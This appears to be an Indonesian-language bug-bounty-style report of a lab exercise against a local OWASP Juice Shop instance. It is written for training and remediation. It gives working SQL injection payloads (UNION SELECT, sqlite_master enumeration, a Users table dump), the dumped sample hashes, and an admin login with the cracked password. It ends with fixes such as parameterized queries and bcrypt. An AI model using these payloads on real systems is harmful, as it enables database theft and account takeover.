# [CRITICAL] SQL Injection → Kompromi Database Penuh & Pengambilalihan Akun Admin

**Target:** OWASP Juice Shop (instance lokal — lab latihan resmi)
**Endpoint:** `GET /rest/products/search`
**Parameter:** `q`
**Tanggal:** 9 Oktober 2026
**Peneliti:** Twist
**Severity:** CRITICAL (CVSS ~9.8)

---

## 1. Ringkasan

Parameter `q` pada endpoint pencarian produk dimasukkan langsung ke query SQL
tanpa sanitasi. Penyerang tanpa autentikasi bisa:

- Menampilkan data arbitrer dari **seluruh database** (20 tabel)
- Mengambil **24 akun pengguna + seluruh hash password**
- Memecahkan hash admin (`md5("admin123")`)
- **Login sebagai administrator** dan mengakses data seluruh pengguna

Tidak butuh akun. Tidak butuh login. Satu request HTTP.

---

## 2. Dampak

| Aspek | Detail |
|---|---|
| Autentikasi diperlukan | **Tidak** — endpoint publik |
| Data terpapar | Seluruh database: 20 tabel |
| Akun terkompromi | 24 akun + hash password |
| Eskalasi | Admin takeover penuh (terbukti) |
| Integritas | Penyerang bisa membaca + mengubah data (`UPDATE`/`DELETE` via stacking) |

Klasifikasi: **Critical** — pengambilalihan penuh tanpa autentikasi.

---

## 3. Langkah Reproduksi

### Bukti 1 — Konfirmasi injeksi

```http
GET /rest/products/search?q=apple HTTP/1.1
Host: localhost:3000
```
→ `200 OK`, 3 produk

```http
GET /rest/products/search?q=apple' HTTP/1.1
```
→ **Error SQL** (karakter kutip masuk ke query)

```http
GET /rest/products/search?q=apple'))-- HTTP/1.1
```
→ `200 OK`, 0 produk — **query valid, filter dimatikan**

Perbedaan antara error dan sukses membuktikan struktur query bisa dikendalikan.

### Bukti 2 — Menentukan jumlah kolom

```http
GET /rest/products/search?q=a')) ORDER BY 9--   → 200 OK  (VALID)
GET /rest/products/search?q=a')) ORDER BY 10--  → ERROR
```
→ Tabel punya **9 kolom**.

### Bukti 3 — UNION untuk menampilkan data arbitrer

```http
GET /rest/products/search?q=qwert')) UNION SELECT 1,2,3,4,5,6,7,8,9--
```
**Respons:**
```json
{"data":[{"id":1,"name":"2","description":"3","price":4,
          "deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}
```
→ Nilai yang saya kirim muncul di respons. **Data arbitrer bisa ditampilkan.**

### Bukti 4 — Enumerasi 20 tabel

```http
GET /rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
```
**Hasil:**
```
Addresses      BasketItems    Baskets        Captchas
Cards          Complaints     Deliverys      Feedbacks
Hints          Memories       PrivacyRequests Products
Quantities     Recycles       SecurityAnswers SecurityQuestions
Users          ChallengeDependencies           Challenges
ImageCaptchas
```

### Bukti 5 — Dump tabel Users

```http
GET /rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
```
**Hasil: 24 akun, seluruh hash password:**
```
admin@juice-sh.op          0192023a7bbd73250516f069df18b500
jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
morty@juice-sh.op          f2f933d0bb0ba057bc8e33b8ebd6d9e8
mc.safesearch@juice-sh.op  b03f4b0ba8b458fa0acdc02cdb953bc8
J12934@juice-sh.op         3c2abc04e4a6ea8f1327d0aae3714b7d
wurstbrot@juice-sh.op      9ad5b0492bbe528583e128d2a8941de4
amy@juice-sh.op            030f05e45e30710c3ad3c32f00de0473
bjoern@juice-sh.op         7f311911af16fa8f418dd1a3051d6810
bjoern@owasp.org           9283f1b2e9669749081963be0462e466
chris.pike@juice-sh.op     10a783b9ed19ea1c67c3a27699f0095b
... (24 total)
```

### Bukti 6 — Memecahkan hash admin

```
target : 0192023a7bbd73250516f069df18b500
md5("admin123") = 0192023a7bbd73250516f069df18b500
✅ COCOK
```

### Bukti 7 — Login sebagai administrator

```http
POST /rest/user/login HTTP/1.1
Content-Type: application/json

{"email":"admin@juice-sh.op","password":"admin123"}
```
**Respons: `200 OK`**
```json
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","umail":"admin@juice-sh.op"}}
```
→ Token JWT 717 karakter diterbitkan untuk akun administrator.

### Bukti 8 — Akses endpoint terproteksi

```
GET /api/Users  (tanpa token)         → 401 Unauthorized
GET /api/Users  (Bearer <token admin>) → 200 OK  → 23 akun terbuka
```
→ **Bypass kontrol akses terbukti.**

---

## 4. Akar Masalah

Query di endpoint pencarian menyusun SQL dengan penggabungan string:

```js
// KIRA-KIRA SEPERTI INI (berdasarkan struktur yang teramati):
db.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${q}%' OR description LIKE '%${q}%')
   AND deletedAt IS NULL) ORDER BY name`
);
```

Nilai `q` dari pengguna masuk ke dalam string query tanpa parameterisasi.
Tanda kutip tunggal menutup string literal, sehingga sisa payload dieksekusi
sebagai SQL.

Petunjuk struktur query dari pengujian:
- `apple'))--` berhasil → query asli punya **dua kurung tutup** sebelum sisa kondisi
- `ORDER BY 10` error → tabel **9 kolom**

---

## 5. Saran Perbaikan

**1. Pakai query terparameterisasi (WAJIB — ini akar masalahnya)**

```js
// JANGAN:
`SELECT * FROM Products WHERE name LIKE '%${q}%'`

// LAKUKAN:
sequelize.query(
  'SELECT * FROM Products WHERE name LIKE :q OR description LIKE :q',
  { replacements: { q: `%${q}%` }, type: QueryTypes.SELECT }
);
```

Atau pakai ORM dengan aman:
```js
Product.findAll({
  where: {
    [Op.or]: [
      { name: { [Op.like]: `%${q}%` } },
      { description: { [Op.like]: `%${q}%` } }
    ]
  }
});
```

**2. Validasi input sebagai lapisan tambahan**
```js
if (typeof q !== 'string' || q.length > 100) return res.status(400).json({ error: 'Input tidak valid' });
```

**3. Prinsip hak akses minimum di database**
Akun database aplikasi tidak perlu hak `DROP`/`ALTER`. Batasi ke `SELECT`/`INSERT`/`UPDATE`
pada tabel yang diperlukan saja.

**4. Jangan simpan password dengan MD5**

MD5 itu fungsi hash cepat, bukan untuk password. Ganti ke:
```js
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);
```
MD5 tanpa salt juga bikin seluruh hash bisa di-crack lewat rainbow table dalam hitungan detik.

**5. Ganti tabel Users dengan admin segera**
Semua 24 kredensial harus direset setelah patch.

---

## 6. Catatan Tambahan (temuan sekunder)

Ditemukan saat recon, terpisah dari kerentanan utama:

| # | Temuan | Endpoint | Severity |
|---|---|---|---|
| 1 | Header `Content-Security-Policy` tidak ada | semua | Low |
| 2 | Header `Strict-Transport-Security` tidak ada | semua | Low |
| 3 | `Access-Control-Allow-Origin: *` | `/` | Low/Medium |
| 4 | `X-Frame-Options` cuma `SAMEORIGIN` (tidak ada CSP `frame-ancestors`) | semua | Info |

---

## 7. Lampiran — Timeline

```
1. Recon header + fingerprint          → 2 temuan header
2. Enumerasi endpoint dari main.js     → 15 API + 21 REST
3. Uji injeksi: apple' vs apple'))--   → INJEKSI TERKONFIRMASI
4. ORDER BY 9 / 10                     → 9 kolom
5. UNION SELECT 1..9                   → data arbitrer tampil
6. sqlite_master                       → 20 tabel
7. Dump Users                          → 24 akun + hash
8. Crack md5 admin123                  → cocok
9. Login admin                         → 200 OK, token terbit
10. /api/Users dengan token            → 401 → 200, 23 akun
```

---

## 8. Pelajaran dari Latihan Ini

```
✓ Recon dulu, baru nyerang — endpoint ketemu dari baca main.js
✓ Uji perbedaan respons (error vs sukses), itu sinyal paling kuat
✓ ORDER BY itu cara paling cepat cari jumlah kolom
✓ Buktiin DAMPAK, bukan cuma "ada injeksi"
   → dump data nyata + login berhasil = laporan yang dibayar
✓ Catat SEMUA langkah dengan request/response mentah
✓ Laporan = reviewer bisa reproduksi tanpa mikir

✗ Jangan stop di "SQLi terdeteksi" — lanjut sampai bukti dampak
✗ Jangan lupa temuan sekunder (header) — sering dibayar terpisah
```
